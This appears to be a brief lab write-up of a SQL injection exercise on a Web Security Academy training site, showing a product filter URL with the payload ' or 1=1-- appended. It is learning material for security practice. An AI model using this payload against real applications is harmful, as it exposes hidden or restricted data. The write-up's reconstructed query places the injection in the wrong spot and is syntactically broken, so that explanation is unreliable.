
We've got the next SQL Query

SELECT * FROM products WHERE category = 'Gifts' AND released = 1


We need to release the application to display one or more unreleased products

Original Link
https://0a850035038ecb8880f54e6f00550058.web-security-academy.net/filter?category=Corporate+gifts

Modified Link with the SQL Injection

https://0a850035038ecb8880f54e6f00550058.web-security-academy.net/filter?category=Corporate+gifts ' or 1=1-- ' 

So now:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 'or 1=1 --'

The -- comments the rest of the query so it will ignore the rest because it could be something like:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 AND permission= Admin